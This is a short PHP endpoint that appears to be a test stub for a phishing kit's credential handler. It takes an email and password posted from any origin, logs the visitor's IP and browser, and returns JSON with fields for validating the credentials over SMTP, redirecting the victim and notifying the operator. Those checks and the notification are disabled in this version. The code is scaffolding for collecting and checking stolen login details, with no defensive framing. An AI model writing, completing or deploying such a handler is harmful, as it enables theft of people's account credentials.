<?php
// Simple test version - no SMTP testing, just basic response
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, X-Requested-With, Authorization, Accept');
header('Access-Control-Allow-Credentials: true');
header('Content-Type: application/json; charset=utf-8');

// Handle preflight OPTIONS request
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit();
}

// Get client information
$ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$browser = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
$timestamp = date('Y-m-d H:i:s');

// Get and validate input
$login = filter_var($_POST['email'] ?? '', FILTER_SANITIZE_EMAIL);
$passwd = $_POST['password'] ?? '';

// Basic validation
if (empty($login) || empty($passwd)) {
    echo json_encode(['signal' => 'not ok', 'msg' => 'Email and password are required']);
    exit;
}

if (!filter_var($login, FILTER_VALIDATE_EMAIL)) {
    echo json_encode(['signal' => 'not ok', 'msg' => 'Invalid email format']);
    exit;
}

// Simple test response - no SMTP testing
$response = [
    'signal' => 'ok',
    'success' => true,
    'msg' => 'Test connection successful! No SMTP testing performed.',
    'attempt' => 1,
    'credentials_valid' => true,
    'smtp_server' => 'test_server',
    'should_redirect' => true,
    'notification_sent' => false,
    'debug_info' => [
        'php_version' => PHP_VERSION,
        'timestamp' => $timestamp,
        'connection_test' => 'Basic test - no SMTP',
        'request_method' => $_SERVER['REQUEST_METHOD'],
        'origin' => $_SERVER['HTTP_ORIGIN'] ?? 'not set',
        'user_agent' => substr($browser, 0, 100),
        'post_data_received' => !empty($_POST),
        'phpmailer_used' => false,
        'validation_method' => 'Basic test',
        'smtp_debug' => ['No SMTP testing performed'],
        'smtp_error_details' => 'None',
        'credentials_tested' => 'Email: ' . $login . ' | Password length: ' . strlen($passwd)
    ]
];

echo json_encode($response);
?>